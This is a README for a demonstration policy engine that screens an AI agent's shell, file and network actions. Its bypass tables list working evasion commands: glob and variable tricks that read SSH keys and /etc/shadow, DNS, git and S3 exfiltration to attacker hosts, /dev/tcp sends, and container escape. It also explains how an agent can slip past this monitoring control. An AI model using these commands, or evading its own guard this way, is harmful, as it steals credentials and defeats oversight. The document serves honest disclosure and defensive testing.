# SafeClaw — demo

> **⚠️ This is a demonstration of an architecture, not a product and not a security
> guarantee.** SafeClaw gates nothing in the SN39 reward path, has earned no reward,
> and its effectiveness is unmeasured. It has **dozens of documented bypasses**
> (catalogued below). Nothing here should be relied on as a containment control.
> The module carries a `DEMO_ONLY = True` flag so this status is unmistakable in code.

## What this is (and is not)

SafeClaw illustrates one idea: **the security decision is made by deterministic
code, never by the LLM.** Every action an agent proposes — a shell command, a file
read/write, a network call — is routed through a policy engine that scores its risk
and returns **ALLOW / ASK / SANDBOX / DENY** *before* the action runs. A DENY never
executes; the agent gets a blocked observation it cannot argue its way past, because
the decision is code, not a prompt.

That last point is narrow and worth stating precisely: it means the LLM cannot *talk*
its way out of a decision already made. It does **not** mean the policy is
unbypassable — an adversary evades the block by crafting bytes the detectors never
classify as DENY in the first place.

## The thesis: the harness makes the decision, not the model

The value being demonstrated is architectural. Prompt-injecting the agent, or the
agent "deciding" a dangerous action is fine, changes nothing: the guard sits between
the agent and the effect, and the guard is a pure function of the action bytes plus a
fixed policy. There is no model in the decision path to persuade.

## How it works

```
action ─▶ normalise() ─▶ detect() ─▶ assess() ─▶ SafeClawGuard.execute()
          (case-fold,     (regex       (hard-deny    (ALLOW → run,
           strip quotes/   signals →     / sandbox    SANDBOX → sandbox_run,
           $HOME, ws)      categories)   / thresholds) DENY|ASK → refuse, log)
```

- **`normalise`** collapses a *fixed, small* set of obfuscations: quotes and
  backslashes, `$HOME`→`~`, whitespace, and case. Nothing else.
- **`detect`** runs regexes for seven categories (credential access, exfiltration,
  host escape, dangerous exec, privilege escalation, raw network, exploit authoring)
  over the concatenated command/path/url/content **surface**, and returns weighted
  `Signal`s.
- **`assess`** maps the signals to a `Decision`: any `hard_deny` category → **DENY**
  on sight; any `sandbox_category` or a score over the sandbox threshold → **SANDBOX**;
  a score over the ask threshold → **ASK**; otherwise **ALLOW**.
- **`SafeClawGuard.execute`** runs the corresponding callable, or refuses, and appends
  an `ActionEvent` to the audit log.

### Profiles and fail-closed

Two `PolicyProfile`s ship. `default()` is a general coding agent (no credentials,
exfil, or escape; destructive/privileged/exploit categories → sandbox). `cybergym()`
recognises that authoring **and running** PoCs is the job, so *all* execution tools
are sandboxed (not denied), while host-credential / exfil / escape stay hard-denied.

Fail-closed is deliberate: a must-SANDBOX action with **no sandbox configured** is
DENIED, not silently run on the host. But that guarantee only holds if the integrating
harness actually wires a real `sandbox_run` — **this demo ships no sandbox.**

## Threat model — read this before trusting anything

The deterministic policy defends against **naive and careless misbehaviour**: an
agent (including a prompt-injected one) that emits a *recognisable* dangerous action
in the clear — reading `~/.ssh/id_rsa`, piping a DB dump into `curl`, opening a
`/dev/tcp` reverse shell, touching `docker.sock` — is deterministically DENIED before
it runs, and every proposed action is scored and logged. That raises the cost of
casual attacks and yields an audit trail.

It does **not** defend against a determined adversary who controls the exact bytes of
a command, because the check is string-matching over text that the shell re-expands
*afterward*. Everything the policy cannot guarantee is delegated to the **sandbox**.

## Known, documented bypasses

The policy is a string matcher over a shell, which is fundamentally incomplete: the
shell resolves globs, variables, and command substitution **after** the policy has
seen the text. Every command below was **run through the real engine and returns
`ALLOW` (not `DENY`)** while still achieving the malicious goal. This is a
representative sample, not an exhaustive list.

### Credential theft the policy ALLOWs

| Technique | Command | Why it evades |
|---|---|---|
| glob | `cat ~/.ssh/id*` | `*` sits where `id_[a-z0-9]+` needs `_`; shell expands to `id_rsa` |
| glob | `cat ~/.ssh/i??rsa` | `?` masks `d`/`_`; neither `id_` nor `_rsa` is literal |
| bracket-glob | `cat ~/.ssh/id[_]rsa` | `id[` / `_]rsa` break both regex branches; `[_]`→`_` |
| var-split | `a=/etc/;b=shadow;cat $a$b` | `/etc/shadow` is never contiguous until `$a$b` joins at runtime |
| var-split | `a=id_;b=rsa;cat ~/.ssh/$a$b` | no token holds `id_rsa` or `_rsa` |
| directory | `tar -cf /tmp/k.tar ~/.ssh` | names the *dir*, not a `ssh/id_*` file; `id_rsa` archived inside |
| directory | `cp -r ~/.aws /tmp/a` | copies `credentials` without naming it |
| directory | `find ~/.ssh -type f -exec cat {} \;` | only the dir path is literal |
| double-slash | `cat //etc//shadow` | `/etc//shadow` breaks the `/etc/shadow` literal; POSIX collapses it |
| alt-reader | `getent shadow` | reads the shadow DB via NSS with no `/etc/shadow` path |

### Exfiltration & escape the policy ALLOWs

| Technique | Command | Why it evades |
|---|---|---|
| DNS | `for b in $(xxd -p f); do dig $b.evil.tld; done` | no clause covers DNS; `xxd` only trips when piped to `curl`/`wget`/`nc` |
| var `/dev/tcp` | `H=h P=443; cat data > /dev/tcp/$H/$P` | reverse-shell clause needs a digit or `bash -i` after `/dev/tcp/` |
| runtime | `python3 -c "urllib...urlopen(url, open(f).read())"` | no `socket`/`/bin/sh` tokens, no `curl`/`@` |
| git | `git push https://gitlab.attacker/e.git HEAD` | no clause references git |
| cloud-cli | `aws s3 sync /data s3://attacker/` | clause lists `aws s3 cp`, not `sync` |
| alt-flag | `wget --post-data="$(cat f)" https://h/i` | only `--post-file` is matched |
| unix-socket | `curl --unix-socket /run/docker.sock http://…` | clause is the literal `/var/run/docker.sock`; `/run` is the symlink target |
| name-split | `N=nsen; ${N}ter -t 1 -m -u -i -n sh` | `nsenter` is never spelled contiguously |
| var-pid | `PID=1; cat /proc/${PID}/root/etc/hostname` | `/proc/1/` literal never appears |

Run `python -c "from cathedral_distill.safeclaw import *; ..."` against any of these to
confirm; `tests/test_safeclaw.py::test_documented_bypasses_evade_the_policy` pins a
subset as an executable invariant so the limitation stays honest.

### A note on the aspirational docstring

An earlier version of the module claimed that unresolvable-obfuscation constructs are
"flagged as uncertain → fail toward the sandbox / ASK, never silently ALLOW." **That
is not implemented** — there is no uncertainty detector; anything with no literal
match is silently ALLOWed. The claim has been corrected in the source; it is called
out here so the discrepancy is on the record.

## The sandbox is the real containment

Because the policy is porous by construction, the load-bearing control is the
**sandbox**: run the agent where **no host secrets are mounted, the network is denied,
and the process is unprivileged.** Then a command that evades the policy has nothing
to steal and nowhere to send it. The relationship is asymmetric:

- the policy is near-worthless as a *boundary* without the sandbox;
- the sandbox is valuable even without the policy.

The policy's real jobs are **monitoring** (an audit trail of every decision) and
**raising the cost of naive attacks** — defense-in-depth on top of the sandbox, not a
substitute for it.

## Monitoring and its limits

`SafeClawGuard` appends an `ActionEvent` per action to an `EventLog`
(`to_jsonl()` for export). This is an **in-memory, append-only list with no
tamper-evidence** — its monitoring value depends entirely on the host harness shipping
events to a trusted external sink. The substring-based `allow_paths` whitelist is also
config-dependent: a poorly chosen allow-path can silently whitelist a malicious
surface. Coverage is illustrative and will produce both false negatives and false
positives.

## Status

Unproven and **not installed** in the SN39 reward path. It has gated no real agent and
earned no reward. The `cybergym_agent` wiring that once referenced it was deliberately
reverted; this module stands alone as an illustration.

## Running the demo and tests

```bash
python -m pytest tests/test_safeclaw.py -q
```

The tests demonstrate the canonical decisions (credential theft / exfil / reverse
shell / host escape → DENY; PoC authoring → SANDBOX; project read → ALLOW), that a
DENY prevents the side effect from firing, that a must-sandbox action with no sandbox
fails closed, and — via `test_documented_bypasses_evade_the_policy` — that the
documented bypasses are *not* denied.

## If this were to become real

A hardening path, roughly in order: (1) move enforcement below the shell — intercept
at the syscall/`execve` layer or run every command through a constrained interpreter,
not a regex over the command string; (2) make the sandbox mandatory and real
(no-secrets mount, egress-deny, unprivileged, seccomp) rather than a caller-supplied
callable; (3) ship the audit log to an external, tamper-evident sink; (4) replace
substring allow-lists with canonicalised path checks; (5) measure — red-team the
policy continuously and track the bypass rate. None of that is done here.
